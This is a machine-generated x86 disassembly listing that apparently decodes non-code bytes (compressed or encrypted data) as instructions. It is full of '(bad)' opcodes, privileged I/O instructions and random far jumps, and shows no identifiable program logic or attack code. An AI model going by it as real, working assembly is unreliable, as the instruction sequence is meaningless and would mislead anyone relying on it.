  445c42:	repnz xchg ecx,eax
  445c44:	das    
  445c45:	mov    cl,BYTE PTR [edi+edi*1+0x4f]
  445c49:	add    ecx,DWORD PTR [ebp+0x32]
  445c4c:	sbb    bh,BYTE PTR [eax+0x4af4e8ef]
  445c52:	ret    0x6a82
  445c55:	push   esp
  445c56:	lahf   
  445c57:	(bad)  
  445c59:	sbb    DWORD PTR [ebp-0x4b43d3fb],0x24
  445c60:	jnp    0x445be3
  445c62:	cli    
  445c63:	pop    ebp
  445c64:	push   es
  445c65:	call   0x92d0:0x1c5eecec
  445c6c:	mov    edi,ds
  445c6e:	rol    esp,1
  445c70:	or     eax,DWORD PTR [eax-0x46]
  445c73:	mov    al,0xae
  445c75:	sahf   
  445c76:	mov    ch,0x35
  445c78:	cld    
  445c79:	inc    eax
  445c7a:	aad    0x47
  445c7c:	add    bl,cl
  445c7e:	repnz nop
  445c80:	les    ebp,FWORD PTR [ecx-0x66]
  445c83:	cmp    BYTE PTR [eax+0x56],bh
  445c86:	sub    al,0x35
  445c88:	adc    edx,esp
  445c8a:	hlt    
  445c8b:	mov    ah,0xa2
  445c8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  445c8e:	xor    al,0x35
  445c90:	test   eax,0x9530434e
  445c95:	jp     0x445c9e
  445c97:	push   0x1aa1c347
  445c9c:	xlat   BYTE PTR ds:[ebx]
  445c9d:	fisubr WORD PTR [ebx+edi*8]
  445ca0:	pushf  
  445ca1:	test   eax,0x8f8ad868
  445ca6:	and    dl,BYTE PTR [ebx+0x19]
  445ca9:	mov    BYTE PTR [esi],dl
  445cab:	inc    ebp
  445cac:	cld    
  445cad:	add    BYTE PTR [esi+edx*8+0x31803cdf],dh
  445cb4:	das    
  445cb5:	lods   eax,DWORD PTR ds:[esi]
  445cb6:	dec    edi
  445cb7:	dec    ebx
  445cb8:	(bad)
  445cbc:	es sbb eax,0x136047d
  445cc2:	mov    dl,dh
  445cc4:	les    eax,FWORD PTR [esi+0x4be3cffe]
  445cca:	adc    bl,BYTE PTR [edi-0x4cee5393]
  445cd0:	adc    al,0x7e
  445cd3:	add    dl,0x81
  445cd6:	sar    BYTE PTR [esi],1
  445cd8:	xor    ah,BYTE PTR [ebx]
  445cda:	jo     0x445c72
  445cdc:	test   BYTE PTR ds:0x179c80df,cl
  445ce2:	mov    dh,0x7
  445ce4:	mov    eax,DWORD PTR [esi-0x21eb05ec]
  445cea:	out    dx,al
  445ceb:	loop   0x445c97
  445ced:	arpl   WORD PTR [ebx-0x63],cx
  445cf0:	dec    esi
  445cf1:	std    
  445cf2:	les    ebp,FWORD PTR [ecx-0x1c]
  445cf5:	aas    
  445cf6:	imul   edi,ebp,0xf8546fc4
  445cfc:	in     al,0x1c
  445cfe:	pop    eax
  445cff:	cmc    
  445d00:	or     DWORD PTR [eax-0x75fed84b],esi
  445d06:	cmp    eax,0xf3e28210
  445d0b:	pop    esi
  445d0c:	adc    ch,BYTE PTR [eax+0x51c692f8]
  445d12:	out    dx,al
  445d13:	daa    
  445d14:	imul   esi,DWORD PTR [eax+0x52d86e15],0x43
  445d1b:	outs   dx,BYTE PTR ds:[esi]
  445d1c:	inc    esi
  445d1d:	inc    esp
  445d1e:	push   esp
  445d1f:	mov    esi,0x45609160
  445d24:	and    eax,0x2abcdc
  445d29:	repnz shl edx,0x67
  445d2d:	pop    edx
  445d2e:	(bad)  
  445d2f:	or     al,0xcc
  445d31:	mov    cs,WORD PTR [esi-0x4a]
  445d34:	pop    ebp
  445d35:	xchg   DWORD PTR [eax],eax
  445d37:	mov    dh,0x69
  445d39:	or     ah,BYTE PTR [edx-0x31a25376]
  445d3f:	popa   
  445d40:	inc    esp
  445d41:	xor    ch,BYTE PTR [esi]
  445d43:	mov    WORD PTR ds:0x85a07b78,ss
  445d49:	sbb    eax,0xf38e0166
  445d4e:	int    0xe4
  445d50:	mov    esi,0x14c50b5e
  445d55:	mov    ?,WORD PTR [esi+0x406a5a84]
  445d5b:	aam    0x82
  445d5d:	dec    ebx
  445d5e:	jbe    0x445d82
  445d60:	lock pop ds
  445d62:	dec    eax
  445d63:	bound  ebp,QWORD PTR [ebx-0x19431d5e]
  445d69:	or     dl,BYTE PTR [edi+0x28]
  445d6c:	aad    0xe8
  445d6e:	inc    edx
  445d6f:	lahf   
  445d70:	add    BYTE PTR [esi+edi*4-0x5a],ch
  445d74:	and    al,0xa
  445d76:	int3   
  445d77:	mov    WORD PTR [edx-0x4a],gs
  445d7a:	mov    ch,0x43
  445d7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  445d7d:	push   ss
  445d7e:	loop   0x445d24
  445d80:	fcomp  QWORD PTR [ebp+0x32]
  445d83:	add    BYTE PTR [edi+ecx*1],0xf6
  445d87:	push   0x869852a3
  445d8c:	ss int 0x4
  445d8f:	fild   DWORD PTR [eax+0x17]
  445d92:	test   al,0xf5
  445d94:	mov    ebx,cs
  445d96:	fwait
  445d97:	mov    eax,0xa372f1a2
  445d9c:	cmp    esi,ebp
  445d9e:	mov    ds:0x814409ad,eax
  445da3:	xchg   esi,eax
  445da4:	dec    esi
  445da5:	test   DWORD PTR [edx+0x30],esp
  445da8:	mov    dl,0xf3
  445daa:	xor    cl,0x92
  445dad:	push   0xffffff9a
  445daf:	and    ebp,esi
  445db1:	loop   0x445e17
  445db3:	in     eax,dx
  445db4:	and    DWORD PTR ds:0xd5239e3c,0xaa79308
  445dbe:	stc    
  445dbf:	pop    ebp
  445dc0:	retf   0x6558
  445dc3:	(bad)  
  445dc4:	sbb    BYTE PTR [ebx+0x6b],al
  445dc7:	jo     0x445e30
  445dc9:	retf   
  445dca:	push   0x8ae8b05e
  445dcf:	mov    bh,0x6
  445dd1:	scas   al,BYTE PTR es:[edi]
  445dd2:	add    dl,bl
  445dd4:	pop    ebp
  445dd5:	cmc    
  445dd6:	stos   DWORD PTR es:[edi],eax
  445dd7:	test   al,0x48
  445dd9:	aam    0xc4
  445ddb:	hlt    
  445ddc:	and    al,0x91
  445ddf:	dec    esp
  445de0:	mov    esp,0x1314b68c
  445de5:	test   al,0x88
  445de7:	lea    ebp,[edx+0x7a]
  445dea:	popa   
  445deb:	or     ebx,DWORD PTR [ebx-0x537535bc]
  445df1:	jns    0x445e70
  445df3:	sub    DWORD PTR [ecx+0x3db40bf6],0xc63aa3
  445dfd:	or     DWORD PTR [edi],ecx
  445dff:	or     al,0xe2
  445e01:	and    ch,cl
  445e03:	mov    esp,0x83456d50
  445e08:	mov    WORD PTR [edi+0x62],cs
  445e0b:	adc    edx,DWORD PTR [edx-0x9]
  445e0e:	shl    BYTE PTR [eax],1
  445e10:	test   BYTE PTR [edi+0x50],cl
  445e13:	inc    esp
  445e14:	mov    WORD PTR ds:0x59b9a68,ss
  445e1a:	clc    
  445e1b:	sbb    BYTE PTR [ebx+0xe4e40d6],dh
  445e21:	add    ch,bh
  445e23:	inc    ebx
  445e24:	pop    ecx
  445e25:	push   0xffffff92
  445e27:	mov    dh,BYTE PTR [edx]
  445e29:	icebp  
  445e2a:	cli    
  445e2b:	and    al,0xeb
  445e2d:	xchg   edi,eax
  445e2e:	mov    al,ds:0xd5acb1cd
  445e33:	inc    ecx
  445e34:	mov    BYTE PTR [edx],0xb9
  445e37:	sbb    al,0x99
  445e39:	shl    BYTE PTR [edi+0x66],0x9c
  445e3d:	pop    edi
  445e3e:	pop    esi
  445e3f:	lds    eax,FWORD PTR [edi-0x15dbaffa]
  445e45:	jae    0x445e09
  445e47:	sbb    edx,DWORD PTR [edi]
  445e49:	mov    al,ds:0x9ebc5b86
  445e4f:	call   0x50c7:0xa81360de
  445e56:	data16 xor al,0x7a
  445e59:	rcl    BYTE PTR [edx+0x53],0xb
  445e5d:	pop    edx
  445e5e:	lds    ebp,FWORD PTR [eax+edi*4+0x7d]
  445e62:	call   0xcf18:0xd5834ef9
  445e69:	xchg   esi,eax
  445e6a:	lock push edx
  445e6c:	daa    
  445e6d:	push   ebx
  445e6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  445e6f:	jb     0x445e5c
  445e71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  445e72:	lea    ebp,[edx+0x3a]
  445e75:	cmp    cl,BYTE PTR [eax-0x6c1ce5cd]
  445e7b:	js     0x445ee5
  445e7d:	mov    ah,0xd
  445e7f:	adc    al,BYTE PTR [esi-0x69]
  445e82:	add    DWORD PTR [ebx-0x1dc5ed7c],ebx
  445e88:	xor    al,0x56
  445e8a:	xchg   edx,eax
  445e8b:	dec    ecx
  445e8c:	fdiv   st,st(0)
  445e8e:	pusha  
  445e8f:	xor    dl,BYTE PTR [esi+ebx*4-0x7c]
  445e93:	out    0xab,al
  445e95:	mov    eax,ds:0xb9443d35
  445e9a:	retf   0x10e5
  445e9d:	sub    dh,ah
  445e9f:	jns    0x445e28
  445ea1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  445ea2:	and    ah,BYTE PTR [eax+0x393a1fc2]
  445ea8:	sbb    BYTE PTR [eax+0xc],dh
  445eab:	push   0x452279d3
  445eb0:	jge    0x445ec6
  445eb2:	fwait
  445eb3:	mov    ch,0x42
  445eb5:	and    DWORD PTR [ecx],esi
  445eb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  445eb8:	out    dx,al
  445eb9:	dec    esp
  445eba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  445ebb:	dec    edi
  445ebc:	and    ebp,DWORD PTR [ebx+0x27d25cd9]
  445ec2:	add    BYTE PTR [ebp+0x22],bh
  445ec5:	xchg   ebx,eax
  445ec6:	ror    DWORD PTR [eax-0x71],0x54
  445eca:	ror    DWORD PTR [edx-0x380cbd9],0xba
  445ed1:	addr16 push cs
  445ed3:	cmp    DWORD PTR [edi],ecx
  445ed5:	test   BYTE PTR [esi],ah
  445ed7:	inc    ebx
  445ed8:	xchg   esi,eax
  445ed9:	sbb    DWORD PTR [esp+edx*2+0x5c],esp
  445edd:	and    DWORD PTR [edi+eiz*1-0x1d74e1a5],ecx
  445ee4:	mov    al,ds:0xf75011e8
  445ee9:	xor    bh,BYTE PTR [edx]
  445eeb:	out    0xac,al
  445eed:	shr    DWORD PTR [ecx],1
  445eef:	retf   
  445ef0:	or     DWORD PTR [edx+0x7e84c00e],esi
  445ef6:	sbb    ebp,DWORD PTR [edi]
  445ef8:	fsub   st,st(1)
  445efa:	jb     0x445f0a
  445efc:	jecxz  0x445eb2
  445efe:	push   eax
  445eff:	lea    edi,fs:[edx-0x7fb7ecf4]
  445f06:	cs sahf 
  445f08:	lods   eax,DWORD PTR ds:[esi]
  445f09:	imul   esi,DWORD PTR [esi],0x25
  445f0c:	test   BYTE PTR [eax],bl
  445f0e:	clc    
  445f0f:	push   esp
  445f10:	add    al,0x27
  445f12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  445f13:	dec    edi
  445f14:	push   edx
  445f15:	inc    esi
  445f16:	mov    BYTE PTR [edx],ch
  445f18:	(bad)  
  445f19:	int3   
  445f1a:	fldcw  WORD PTR [eax+0x52]
  445f1d:	rol    DWORD PTR [edi],cl
  445f1f:	loop   0x445f27
  445f21:	add    al,0xc4
  445f23:	(bad)  
  445f24:	xlat   BYTE PTR ds:[ebx]
  445f25:	xchg   al,dh
  445f27:	push   ss
  445f28:	mov    edx,DWORD PTR [edx+0x5e]
  445f2b:	jle    0x445f48
  445f2d:	or     ah,BYTE PTR [ebx]
  445f2f:	call   0xf62ce13b
  445f34:	or     al,0xb4
  445f36:	mov    eax,0x99915606
  445f3c:	aam    0x6e
  445f3e:	jge    0x445f34
  445f40:	sti    
  445f41:	les    esp,FWORD PTR [ecx]
  445f43:	add    BYTE PTR [eax],bl
  445f45:	rcr    DWORD PTR [eax+esi*1+0x75],0x4a
  445f4a:	test   BYTE PTR [ecx+0x6a57a86c],0xee
  445f51:	mov    esp,0xa10dbe9b
  445f56:	adc    BYTE PTR [ebx+0x1e],cl
  445f59:	cmp    al,0x82
  445f5b:	mov    edx,0x6fc52dd5
  445f60:	or     esi,DWORD PTR [edx+esi*4-0x1b]
  445f64:	(bad)  
  445f65:	loopne 0x445fc0
  445f67:	inc    esi
  445f68:	mov    bh,0xec
  445f6a:	jmp    0xb044c021
  445f6f:	inc    ebx
  445f70:	and    eax,0xe7c366aa
  445f75:	cmp    dl,BYTE PTR [edx+0x30b01781]
  445f7b:	aaa    
  445f7c:	dec    edx
  445f7d:	loopne 0x445f00
  445f7f:	lods   eax,DWORD PTR ds:[esi]
  445f80:	xor    BYTE PTR [eax-0x26],cl
  445f83:	add    al,0x77
  445f85:	dec    eax
  445f86:	sbb    al,0x8a
  445f88:	movaps XMMWORD PTR [ecx+0x43],xmm4
  445f8c:	mov    dh,0x26
  445f8e:	cmp    ah,BYTE PTR [edi+0xb94904c]
  445f94:	test   DWORD PTR [ecx+0x61],edx
  445f97:	jo     0x446015
  445f99:	ins    BYTE PTR es:[edi],dx
  445f9a:	xor    BYTE PTR [eax],ch
  445f9c:	mov    dh,0x43
  445f9e:	jae    0x445fb3
  445fa0:	or     al,0x46
  445fa2:	stc    
  445fa3:	add    cl,BYTE PTR [esp+ebx*2-0x12]
  445fa7:	inc    eax
  445fa8:	or     eax,0x7dd200df
  445fad:	cmp    BYTE PTR [esi-0x5fbf8aa6],0x9c
  445fb4:	mov    bl,0x8e
  445fb6:	call   0x7db0:0x909d7536
  445fbd:	inc    ecx
  445fbe:	lock enter 0xc040,0x26
  445fc3:	stos   DWORD PTR es:[edi],eax
  445fc4:	sub    eax,0xefd6cf6a
  445fc9:	(bad)  
  445fca:	cmp    al,0xec
  445fcc:	out    0x58,al
  445fce:	adc    BYTE PTR [ebx+0x4bd32ab6],bl
  445fd4:	test   al,0x8
  445fd6:	sbb    eax,0x52fd900a
  445fdb:	mov    ch,cl
  445fdd:	pop    es
  445fde:	push   ebx
  445fdf:	outs   dx,DWORD PTR ds:[esi]
  445fe0:	stos   BYTE PTR es:[edi],al
  445fe1:	push   esp
  445fe2:	out    0x25,al
  445fe4:	add    BYTE PTR [esi],cl
  445fe6:	sub    BYTE PTR [esi-0x50],ch
  445fe9:	aad    0x8a
  445feb:	xchg   BYTE PTR [esi],dh
  445fed:	into   
  445fee:	int3   
  445fef:	inc    eax
  445ff0:	inc    eax
  445ff1:	mov    bh,0x19
  445ff3:	push   ebp
  445ff4:	mov    eax,ds:0xa6f86c24
  445ff9:	mov    bh,ch
  445ffb:	sbb    bl,BYTE PTR [ebp+esi*2-0x50ef9c2f]
  446002:	out    dx,al
  446003:	nop
  446004:	xchg   ebx,eax
  446005:	mov    al,ds:0x114a4022
  44600a:	mov    ah,0x35
  44600c:	inc    edi
  44600d:	push   ecx
  44600e:	cld    
  44600f:	jbe    0x445fcf
  446011:	mov    cs,esp
  446013:	mov    eax,0x2d7456de
  446018:	jmp    0x445fe6
  44601a:	mov    dh,0x38
  44601c:	cld    
  44601d:	into   
  44601e:	cmc    
  44601f:	inc    esi
  446020:	test   eax,0x73811505
  446025:	inc    eax
  446026:	dec    edx
  446027:	ss je  0x44602e
  44602a:	jbe    0x44601e
  44602c:	xchg   edx,eax
  44602d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44602e:	repnz sub BYTE PTR [ebp+0x12],dh
  446032:	push   0x51a40bdc
  446037:	and    BYTE PTR [edi+0x1b],0xf8
  44603b:	in     al,0x1d
  44603d:	dec    ecx
  44603e:	jle    0x44600b
  446040:	sbb    BYTE PTR ds:0x4c0d8ed,al
  446046:	fnsave [ecx+esi*1-0x5e0f10c4]
  44604d:	pop    ebp
  44604e:	aam    0xa7
  446050:	cmp    bh,0x72
  446053:	xor    bh,BYTE PTR [esi+0x3daa070]
  446059:	or     ch,BYTE PTR [edx]
  44605b:	daa    
  44605c:	fisttp WORD PTR [edx]
  44605e:	push   edx
  44605f:	add    DWORD PTR [ebp-0x737db0fb],ecx
  446065:	xchg   esi,eax
  446066:	js     0x44605c
  446068:	inc    esi
  446069:	xor    eax,0x46c56684
  44606e:	pop    esi
  44606f:	cwde   
  446070:	inc    eax
  446071:	into   
  446072:	scas   al,BYTE PTR es:[edi]
  446073:	fs xchg edx,eax
  446075:	rol    dh,0xb2
  446078:	cmp    al,0x76
  44607a:	add    al,0x25
  44607c:	mov    eax,ds:0xdf1ab834
  446081:	and    al,0xb0
  446083:	mov    DWORD PTR [eax],esi
  446085:	lods   al,BYTE PTR ds:[esi]
  446086:	imul   ebp,edx,0x60
  446089:	mov    ah,0x4
  44608b:	shl    BYTE PTR [ecx],0x89
  44608e:	xchg   BYTE PTR gs:[edi-0x2368db3e],cl
  446095:	xchg   edx,eax
  446096:	cld    
  446097:	xor    bl,BYTE PTR [esi+0x9]
  44609a:	inc    esp
  44609b:	mov    ds:0xd6527b0c,eax
  4460a0:	loopne 0x446118
  4460a2:	add    DWORD PTR [ebp-0xf3b674a],edi
  4460a8:	(bad)  
  4460a9:	fsubr  QWORD PTR [edx-0x79]
  4460ac:	push   ebp
  4460ad:	and    al,bl
  4460af:	ror    DWORD PTR ds:0x6a05be46,1
  4460b5:	xchg   BYTE PTR [esi+0xeeaadd6],al
  4460bb:	pop    eax
  4460bc:	or     DWORD PTR [eax],ecx
  4460be:	in     al,dx
  4460bf:	cwde   
  4460c0:	xor    dh,BYTE PTR [ebp+0x70e4b5a1]
  4460c6:	call   0x6f3ca71d
  4460cb:	in     al,0x58
  4460cd:	popa   
  4460ce:	or     eax,0xf0554c78
  4460d3:	cmp    DWORD PTR [esi+0x2702698e],0x98011c36
  4460dd:	xor    al,0xf2
  4460df:	ins    BYTE PTR es:[edi],dx
  4460e0:	push   edi
  4460e1:	inc    esp
  4460e2:	push   esi
  4460e3:	ret    0xe318
  4460e6:	add    DWORD PTR [edi-0x37670d3c],esp
  4460ec:	pop    ebx
  4460ed:	imul   eax,DWORD PTR [edi-0x6a],0x2a
  4460f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4460f2:	mov    dl,0x78
  4460f4:	(bad)  
  4460f5:	inc    ecx
  4460f6:	call   0xc44a:0x8351a078
  4460fd:	add    BYTE PTR ds:0xd4882060,al
  446103:	sti    
  446104:	and    DWORD PTR [edx+0x41],ebp
  446107:	mov    edi,0x1ab10778
  44610c:	jbe    0x446122
  44610e:	add    al,0xaa
  446110:	loop   0x44616b
  446112:	inc    eax
  446113:	or     bl,BYTE PTR gs:[esi-0x51d511f6]
  44611a:	mov    DWORD PTR [edx+0x78],ebp
  44611d:	sub    eax,0x5d8ec33a
  446122:	cmp    BYTE PTR [esi-0x40],0xda
  446126:	pop    eax
  446127:	jmp    0x6a18:0x9a38440d
  44612e:	add    eax,DWORD PTR [edi]
  446130:	push   eax
  446131:	mov    eax,ds:0x84b7c340
  446136:	outs   dx,BYTE PTR ds:[esi]
  446137:	int3   
  446138:	push   0xa3029134
  44613d:	sub    BYTE PTR [esp+edi*2+0x36],dl
  446141:	rol    BYTE PTR [eax],cl
  446143:	jmp    0x6cc70773
  446148:	xchg   edi,eax
  446149:	mov    WORD PTR [ebx],fs
  44614b:	jecxz  0x44617a
  44614d:	pop    ss
  44614e:	cs cmp al,0xb8
  446151:	mov    ch,0xe0
  446153:	adc    DWORD PTR [edx+esi*8-0x16],0xdb7372c1
  44615b:	add    eax,0xcca63c04
  446160:	(bad)  
  446161:	xchg   esp,eax
  446162:	call   0x3c7e:0xc48cab4a
  446169:	mov    ah,0x55
  44616b:	xchg   edx,eax
  44616c:	jmp    0x68b423fc
  446171:	mov    cl,BYTE PTR [edi-0x4f03bc38]
  446177:	aad    0x68
  446179:	xor    al,0x2c
  44617b:	and    BYTE PTR [edx+0x1f09416d],dl
  446181:	sub    eax,0x18ba6e2c
  446186:	test   al,0x34
  446188:	hlt    
  446189:	test   BYTE PTR [esi],0xdc
  44618c:	scas   eax,DWORD PTR es:[edi]
  44618d:	fdivr  QWORD PTR [edx+0x2]
  446190:	push   ds
  446191:	idiv   BYTE PTR [ebx+0x61]
  446194:	ror    BYTE PTR ds:0xa51aa2d8,cl
  44619a:	es mov eax,0x5a54a806
  4461a0:	push   0x57
  4461a2:	pop    esp
  4461a3:	mov    edx,DWORD PTR [esp+esi*1-0x17fe5ddc]
  4461aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4461ab:	or     al,0x8
  4461ad:	inc    esi
  4461ae:	ins    DWORD PTR es:[edi],dx
  4461af:	shr    BYTE PTR [ebx+0x41],1
  4461b2:	js     0x44614a
  4461b4:	and    edx,ebx
  4461b6:	sub    dl,BYTE PTR [eax]
  4461b8:	mov    ebx,0x43ed3406
  4461bd:	sub    BYTE PTR [edi+0x34],ah
  4461c0:	sbb    edi,DWORD PTR [eax]
  4461c2:	push   esp
  4461c3:	and    ecx,esp
  4461c5:	mov    bl,0x80
  4461c7:	sar    edx,0xd4
  4461ca:	mov    ebp,0xf8486fd4
  4461cf:	push   ss
  4461d0:	int3   
  4461d1:	or     dh,BYTE PTR [eax+0x7d344d]
  4461d7:	icebp  
  4461d8:	sar    DWORD PTR [esi+edx*8-0x4b],cl
  4461dc:	mov    edx,0x4d705bc
  4461e1:	rcl    BYTE PTR [esi+ecx*8],1
  4461e4:	cmp    al,al
  4461e6:	fcomp  DWORD PTR [esi+0x5d8d1f52]
  4461ec:	ds fdivr st,st(2)
  4461ef:	mov    al,0xf7
  4461f1:	pushf  
  4461f2:	mov    ebp,0x7e67a2d6
  4461f7:	sbb    ebp,DWORD PTR [edx+0x14c2b2f]
  4461fd:	dec    eax
  4461fe:	push   cs
  4461ff:	and    al,0x61
  446201:	inc    ebp
  446202:	cwde   
  446203:	jbe    0x4461e0
  446205:	lea    ecx,ds:0x99e1057
  44620b:	adc    al,0xb3
  44620d:	ret    0xb48
  446210:	loop   0x4461b5
  446212:	data16 scas al,BYTE PTR es:[edi]
  446214:	jmp    0x829c1453
  446219:	push   ss
  44621a:	ins    BYTE PTR es:[edi],dx
  44621b:	push   esi
  44621c:	popa   
  44621d:	fs fs jmp 0xee5a:0xad597de8
  446226:	aas    
  446227:	les    edi,FWORD PTR [esp+esi*4+0x29b022ac]
  44622e:	or     esi,edi
  446230:	loop   0x446278
  446232:	xor    al,BYTE PTR [eax-0x3ff0aede]
  446238:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  446239:	mov    esi,0x24d7a0dc
  44623e:	push   eax
  44623f:	cmp    BYTE PTR [edi-0x4904950c],0x21
  446246:	rcl    BYTE PTR [ebx+0x1690e75c],1
  44624c:	faddp  st(6),st
  44624e:	out    0x7e,al
  446250:	push   ss
  446251:	or     dh,BYTE PTR [edi+0x20]
  446254:	jp     0x44628a
  446256:	mov    al,0x58
  446258:	ret    0xf45e
  44625b:	pop    edx
  44625c:	les    eax,FWORD PTR [ecx-0x3577ccbc]
  446262:	(bad)  
  446263:	hlt    
  446264:	mov    dh,cl
  446266:	ins    BYTE PTR es:[edi],dx
  446267:	mov    al,ds:0xb2507476
  44626c:	inc    eax
  44626d:	call   0x1d00:0x921f8993
  446274:	push   ebp
  446275:	xchg   BYTE PTR [ebx-0x301dfb88],al
  44627b:	pop    esi
  44627c:	nop
  44627d:	leave  
  44627e:	xchg   ebx,eax
  44627f:	push   eax
  446280:	aam    0x2a
  446282:	sub    ah,BYTE PTR ds:[ecx+eax*1]
  446286:	fsubr  QWORD PTR [eax+edi*4-0x42]
  44628a:	push   eax
  44628b:	push   es
  44628c:	mov    al,ds:0x32c3a3e6
  446291:	mov    ds:0x46b95aae,al
  446296:	mov    BYTE PTR [edi],ah
  446298:	jmp    0x44621f
  44629a:	jp     0x446256
  44629c:	jge    0x44622a
  44629e:	fdivr  DWORD PTR ds:0x7c853468
  4462a4:	hlt    
  4462a5:	xchg   edi,eax
  4462a6:	xchg   ebp,eax
  4462a7:	sbb    ebx,DWORD PTR [ebp+0x34]
  4462aa:	sahf   
  4462ab:	mov    DWORD PTR [ecx-0xdbdb914],esi
  4462b1:	imul   ebp,DWORD PTR [ebp+0x37d6011e],0x9
  4462b8:	fld    DWORD PTR ds:0x589aadc4
  4462be:	jno    0x446304
  4462c0:	arpl   WORD PTR [esi+eiz*4-0x65f57bfa],di
  4462c7:	xor    al,0x47
  4462c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4462ca:	lock call 0x698a:0xc4700e9a
  4462d2:	jge    0x446266
  4462d4:	sub    BYTE PTR [ebx],0x6
  4462d7:	int    0x3
  4462d9:	(bad)  
  4462da:	aam    0x62
  4462dc:	push   0xcddcc4b4
  4462e1:	jp     0x44628d
  4462e3:	in     eax,dx
  4462e4:	mov    eax,ds:0x171c1581
  4462e9:	mov    eax,ds:0x7620bddc
  4462ee:	(bad)  
  4462ef:	call   0xc493474
  4462f4:	lods   al,BYTE PTR ds:[esi]
  4462f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4462f6:	pop    edx
  4462f7:	out    dx,eax
  4462f8:	sbb    ah,dl
  4462fa:	sub    eax,DWORD PTR [edx]
  4462fc:	enter  0xa278,0xf8
  446300:	xor    BYTE PTR [eax-0x4ca8930a],cl
  446306:	lods   al,BYTE PTR ds:[esi]
  446307:	xor    eax,0x7528ffe6
  44630c:	shr    DWORD PTR [eax+0x50],cl
  44630f:	jg     0x44633f
  446311:	adc    eax,0x8f5b63c2
  446316:	inc    eax
  446317:	(bad)  
  446318:	mov    bh,0x98
  44631a:	pusha  
  44631b:	cdq    
  44631c:	cmp    eax,0xcccf0f13
  446321:	imul   edx,esp,0x6c5920f3
  446327:	test   al,0xb0
  446329:	outs   dx,BYTE PTR ds:[esi]
  44632a:	data16 xlat BYTE PTR ds:[ebx]
  44632c:	lods   al,BYTE PTR ds:[esi]
  44632d:	xor    al,0xba
  44632f:	xor    bh,BYTE PTR [edi]
  446331:	loopne 0x446337
  446333:	cmp    ebx,DWORD PTR [esi]
  446335:	gs fcmove st,st(1)
  446338:	adc    bh,BYTE PTR [ebx*2+0x68105d18]
  44633f:	xor    BYTE PTR [edx],0xc0
  446342:	bound  ebp,QWORD PTR [ecx-0x5fea544a]
  446348:	hlt    
  446349:	push   ss
  44634a:	call   0x267f923c
  44634f:	ret    0x3aeb
  446352:	mov    BYTE PTR cs:0x66ca7a0d,bl
  446359:	cmp    DWORD PTR ss:[esi-0x31],ebx
  44635d:	mov    dh,0xd6
  44635f:	and    BYTE PTR [eax+0x34f5e088],al
  446365:	pushf  
  446366:	loop   0x446374
  446368:	imul   ebp,DWORD PTR [edx-0x7b5c3bed],0xffffff99
  44636f:	and    BYTE PTR [edx-0x50],0xb5
  446373:	mov    ah,BYTE PTR [edi]
  446375:	push   esp
  446376:	les    ebx,FWORD PTR [eax+0x18]
  446379:	inc    esi
  44637a:	adc    DWORD PTR [eax],0x3d
  44637d:	push   ebx
  44637e:	inc    edx
  44637f:	sbb    DWORD PTR [edi+0x5a09b2a2],ebx
  446385:	sub    BYTE PTR [eax],bh
  446387:	xchg   esp,eax
  446388:	test   DWORD PTR [ebx],esi
  44638a:	int3   
  44638b:	dec    BYTE PTR [edx-0x2f2b4e26]
  446391:	sub    al,0x60
  446393:	test   al,0xf9
  446395:	xor    DWORD PTR [edx],esi
  446397:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  446398:	fsub   DWORD PTR [eax]
  44639a:	stos   BYTE PTR es:[edi],al
  44639b:	pop    ebx
  44639c:	(bad)  
  44639d:	jecxz  0x4463d3
  44639f:	mov    ch,0x16
  4463a1:	sbb    al,0x1
  4463a3:	js     0x44639d
  4463a5:	push   ebx
  4463a6:	push   eax
  4463a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4463a8:	pop    edx
  4463a9:	mov    ah,0x6e
  4463ab:	push   ss
  4463ac:	xor    al,0x45
  4463ae:	jbe    0x1ebe6624
  4463b4:	fbld   TBYTE PTR [ecx-0x31c9d971]
  4463ba:	test   DWORD PTR [eax-0x2a],esi
  4463bd:	adc    ah,bh
  4463bf:	push   ss
  4463c0:	cmp    eax,0x1b7c78d0
  4463c5:	jb     0x4463b1
  4463c7:	cmp    ecx,esi
  4463c9:	cmp    bh,BYTE PTR [edx-0x6ff04f78]
  4463cf:	dec    eax
  4463d0:	or     al,BYTE PTR [esi]
  4463d2:	adc    BYTE PTR [ebx],0xcd
  4463d5:	inc    esi
  4463d6:	adc    ebx,DWORD PTR [esi]
  4463d8:	xchg   esp,eax
  4463d9:	mov    bl,0x2e
  4463db:	mov    al,ds:0x7d043f5
  4463e0:	ins    BYTE PTR es:[edi],dx
  4463e1:	sub    eax,DWORD PTR [ebp+0x40a5c75e]
  4463e7:	ins    BYTE PTR es:[edi],dx
  4463e8:	clc    
  4463e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4463ea:	push   es
  4463eb:	fsubr  DWORD PTR [esi-0x46]
  4463ee:	icebp  
  4463ef:	cmp    BYTE PTR [ebx],0xe
  4463f2:	sahf   
  4463f3:	enter  0x4225,0xc7
  4463f7:	cmp    al,0x79
  4463f9:	add    BYTE PTR [edx+0xd],cl
  4463fc:	pop    es
  4463fd:	mov    al,0x1a
  4463ff:	inc    esi
  446400:	sub    ebp,esp
  446402:	push   cs
  446403:	push   esi
  446404:	enter  0xba9a,0x94
  446408:	add    BYTE PTR [esi-0x4a5e212],0x25
  44640f:	mov    ds:0x9d10afd8,eax
  446414:	inc    edi
  446415:	sbb    al,0xda
  446417:	fdivr  st(7),st
  446419:	xor    dh,0x50
  44641c:	adc    al,0xd0
  44641e:	das    
  44641f:	xlat   BYTE PTR ds:[ebx]
  446420:	sub    BYTE PTR [ebp-0x5fc3d672],cl
  446426:	(bad)  
  446427:	jno    0x4463cf
